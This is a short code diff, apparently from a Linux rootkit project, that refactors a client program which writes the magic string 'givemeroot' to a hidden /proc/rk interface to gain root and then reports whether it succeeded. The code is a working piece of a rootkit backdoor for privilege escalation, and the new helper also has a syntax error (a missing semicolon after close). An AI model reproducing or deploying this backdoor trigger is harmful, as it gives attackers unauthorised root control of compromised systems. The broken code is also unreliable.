@@ -19,6 +19,19 @@ extern void *(*real_dlsym)(void *handle, const char *name);
 
 void *libc;
 
+static int rk_exec(const char *file, const char *cmd)
+{
+    int fd;
+
+    if((fd = open(file, O_WRONLY)) < 0)
+        return 1;
+
+    write(fd, cmd, strlen(cmd));
+    close(fd)
+
+    return 0;
+}
+
 int main(void)
 {
     int fd, uid, orig_uid, orig_gid;
@@ -31,8 +44,7 @@ int main(void)
     if(orig_uid > 0)
         printf("Not Root!\r\n");
 
-    fd = open("/proc/rk", O_WRONLY);
-    write(fd, "givemeroot", 10);
+    rk_exec("/proc/rk", "givemeroot");
 
     uid = getuid();
 
@@ -40,8 +52,6 @@ int main(void)
         printf("Are Root!\r\n");
     else if(uid == orig_uid)
         printf("Still Not Root!\r\n");
-
-    close(fd);
 
     setuid(orig_uid);
     setgid(orig_gid);
